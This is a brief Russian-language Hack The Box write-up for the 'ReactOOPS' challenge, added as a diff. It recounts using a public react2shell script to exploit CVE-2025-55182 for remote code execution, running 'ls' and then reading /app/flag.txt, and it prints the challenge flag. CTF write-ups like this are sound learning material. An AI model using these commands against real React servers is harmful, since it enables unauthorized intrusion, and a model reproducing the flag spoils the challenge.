@@ -1,0 +1,32 @@
+# ReactOOPS (HTB) — mini write-up
+
+
+## Что было
+Я быстро понял, что задача не про “функционал сайта”, потому что после анализа исходников стало видно: фронт — почти пустой, без реальной логики, значит искать SQLi/IDOR/обход авторизации там просто негде. Дальше помогло название **ReactOOPS** — явный намёк на косяк в React/Next.js. Поэтому я сфокусировался на уязвимостях RSC/Flight и в итоге вышел на **React2Shell (CVE-2025-55182)**, что дало RCE и позволило прочитать `/app/flag.txt`.
+
+
+
+## Эксплойт (самое главное)
+Я использовал готовый набор скриптов `react2shell`.
+
+```bash
+git clone https://github.com/freeqaz/react2shell
+cd react2shell
+chmod +x *.sh
+```
+
+Проверка RCE:
+```bash
+./exploit-redirect.sh http://<IP>:<PORT> "ls"
+```
+
+Забрать флаг:
+```bash
+./exploit-redirect.sh -q http://<IP>:<PORT> "cat /app/flag.txt"
+```
+
+Флаг: `HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
+`
+
+
+
